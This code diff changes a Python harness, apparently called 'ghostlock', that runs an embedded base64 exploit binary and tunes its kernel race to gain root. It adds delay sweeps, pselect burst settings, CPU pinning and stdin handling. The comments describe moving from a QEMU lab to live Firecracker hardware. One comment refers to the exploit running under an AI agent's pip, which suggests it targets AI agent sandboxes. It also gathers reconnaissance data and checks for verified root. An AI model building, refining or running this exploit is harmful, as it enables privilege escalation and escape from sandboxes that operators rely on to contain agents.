@@ -70,14 +70,49 @@ TMO = float(os.environ.get("GLK_TMO", "720"))
 # Per-run budget (seconds) for one exploit execution.
 RUN_TMO = float(os.environ.get("GLK_RUN_TMO", "240"))
 # Delay rotation list, microseconds. 460 first (the value validated in the
-# QEMU lab), then a hypothesis-driven sweep: real Firecracker hardware runs
-# the same code ~15-30x faster than TCG, so the equivalent race window is
-# likely much smaller.  A clean miss per delay costs only tens of seconds.
+# QEMU lab), then a sweep incl. sub-15 us entries: live telemetry showed the
+# sprayed-fd signal beating the consumer into select even at 10 us, so 0 us
+# (select entered synchronously right after the green light) is now tried.
 DELAYS = [int(x) for x in
            os.environ.get("GLK_DELAYS",
-                          "460,50,30,20,15,10,7,5,3,2,1,100,75,40,25,12,8,6,"
-                          "4,450,455,465,470,150,200")
+                          "460,50,30,20,15,10,5,3,2,1,0,100,75,40,25,12,8,6,"
+                          "4,450,455,465,470,7,150,200")
            .split(",") if x.strip()]
+
+# Consumer pselect burst size (profile max_calls/burst_calls).  Lab result:
+# any burst>1 deadlocks the route (hang before pre-select) -- the burst
+# protocol is not "retry on invalid", the consumer parks somewhere we cannot
+# see.  Keep stock single-shot (0) unless reversed first.
+BURST = int(os.environ.get("GLK_BURST", "0"))
+
+# Thread CPU pinning variant (profile execution.recommended_cpus.main /
+# .consumer -- main is already 0):
+#   split  - stock: consumer on cpu1 (validated on TCG, 2 stacked vcpus)
+#   same0  - consumer pinned to cpu0 with main: forces serialized
+#            interleaving on real hardware, where the owner thread currently
+#            wins the race and signals the sprayed fds before the consumer
+#            can enter the (then instantly-ready) select.
+#   rotate - alternate per run.
+CPU_MODE = os.environ.get("GLK_CPUS", "split")  # rotate|split|same0 (same0 wedges the lab select - do not ship)
+
+
+def patch_cpus(profile_bytes, consumer_cpu):
+    """Patch execution.recommended_cpus.consumer (positional: the first
+    'consumer' after 'recommended_cpus'; the generic 'main'/'consumer'
+    strings exist elsewhere in the blob)."""
+    b = bytearray(profile_bytes)
+    idx = bytes(b).find(b"recommended_cpus")
+    if idx < 0:
+        raise RuntimeError("recommended_cpus key not found")
+    m = bytes(b).find(b"main", idx)
+    if m < 0:
+        raise RuntimeError("main key not found after recommended_cpus")
+    c = bytes(b).find(b"consumer", m)
+    if c < 0:
+        raise RuntimeError("consumer key not found after main")
+    b[c + len(b"consumer"):c + len(b"consumer") + 4] = int(
+        consumer_cpu).to_bytes(4, "little")
+    return bytes(b)
 # Recon blob caps (bytes, raw before xz).
 CAP_TEXT = 128 * 1024
 CAP_BLOB = int(os.environ.get("GLK_BLOB_MAX", str(4 * 1024 * 1024)))
@@ -384,14 +419,28 @@ KEY_LINE = re.compile(
     r"epoch|ready|parked)")
 
 
-def patch_delay(profile_bytes, delay_us):
+def patch_delay(profile_bytes, delay_us, burst=None):
+    """Patch per-run knobs into the embedded profile.
+
+    burst: consumer select burst size (max_calls/burst_calls).  The stock
+    geometry allows a single pselect entry per route; on fast (non-TCG)
+    hardware the sprayed fd signal can land before the consumer enters the
+    select, which makes every attempt return instantly (live: post-select
+    +0ms ret=70-88, calls=0, deterministic miss).  Allowing a burst of
+    entries lets the consumer retry until it catches a blocked select --
+    the signal arriving DURING the blocked select -- which is what the
+    TCG-validated geometry implicitly did.  burst=None keeps the stock value.
+    """
     b = bytearray(profile_bytes)
-    key = b"enter_delay_us"
-    i = bytes(b).find(key)
-    if i < 0:
-        raise RuntimeError("profile key enter_delay_us not found")
-    off = i + len(key)
-    b[off:off + 4] = int(delay_us).to_bytes(4, "little")
+    patches = [(b"enter_delay_us", int(delay_us))]
+    if burst:
+        patches += [(b"max_calls", int(burst)), (b"burst_calls", int(burst))]
+    for key, val in patches:
+        i = bytes(b).find(key)
+        if i < 0:
+            raise RuntimeError(f"profile key {key.decode()} not found")
+        off = i + len(key)
+        b[off:off + 4] = val.to_bytes(4, "little")
     return bytes(b)
 
 
@@ -445,7 +494,8 @@ def _append_rootscript(home):
     return False
 
 
-def run_one(binary, profile_b64, delay_us, budget):
+def run_one(binary, profile_b64, delay_us, budget, burst=None,
+            consumer_cpu=None):
     home = tempfile.mkdtemp(prefix=".glk", dir="/tmp" if
                            os.path.isdir("/tmp") else ".")
     os.chmod(home, 0o700)
@@ -454,8 +504,11 @@ def run_one(binary, profile_b64, delay_us, budget):
         f.write(base64.b64decode(EMBED_BINARY_B64))
     os.chmod(binp, 0o700)
     prof = os.path.join(home, "profile.glk1")
+    profb = patch_delay(base64.b64decode(profile_b64), delay_us, burst)
+    if consumer_cpu is not None:
+        profb = patch_cpus(profb, consumer_cpu)
     with open(prof, "wb") as f:
-        f.write(patch_delay(base64.b64decode(profile_b64), delay_us))
+        f.write(profb)
 
     env = dict(os.environ)
     env["GHOSTLOCK_HOME"] = home
@@ -473,9 +526,23 @@ def run_one(binary, profile_b64, delay_us, budget):
     # Instead the child writes to a plain file and we poll it lazily.
     outfile = os.path.join(home, "out.txt")
     of = open(outfile, "wb")
+    # The exploit's pselect route plants fd bits that include the child's
+    # stdin.  If stdin is always-readable (e.g. /dev/null or a drained
+    # pipe, as under an AI agent's pip), the pselect returns instantly, never
+    # sleeps, and the route counts zero valid calls (deterministic MISS --
+    # observed live).  A pipe whose write end we hold (and never write)
+    # makes stdin block, restoring the lab's calls=1 behavior.
+    stdin_mode = os.environ.get("GLK_CHILD_STDIN", "pipe")
+    if stdin_mode == "devnull":
+        sin = subprocess.DEVNULL
+    elif stdin_mode == "inherit":
+        sin = None
+    else:
+        sin = subprocess.PIPE
     try:
         p = subprocess.Popen(
             [binp, "--load-prebuilt-profile", prof],
+            stdin=sin,
             stdout=of, stderr=subprocess.STDOUT,
             env=env, cwd=home, start_new_session=True)
     except Exception as e:
@@ -636,12 +703,22 @@ def exploit_phase(deadline):
                 "profile_release": want, "running_release": got}
     won = False
     win_delay = None
+    variant_seen = {}
     for d in DELAYS:
         left = deadline - time.time()
         if left < 20:
             break
+        if CPU_MODE == "same0":
+            cc = 0
+        elif CPU_MODE == "split":
+            cc = None
+        else:                      # rotate: alternate consumer pinning
+            cc = None if (len(DELAYS) and variant_seen.get("n", 0) % 2 == 0) \
+                else 0
+        variant_seen["n"] = variant_seen.get("n", 0) + 1
         rec = run_one(EMBED_BINARY_B64, EMBED_PROFILE_B64, d,
-                      min(RUN_TMO, left))
+                      min(RUN_TMO, left), burst=(BURST or None),
+                      consumer_cpu=cc)
         homes.append(rec.pop("_home", None))
         runs.append(rec)
         if rec.get("verified_root"):
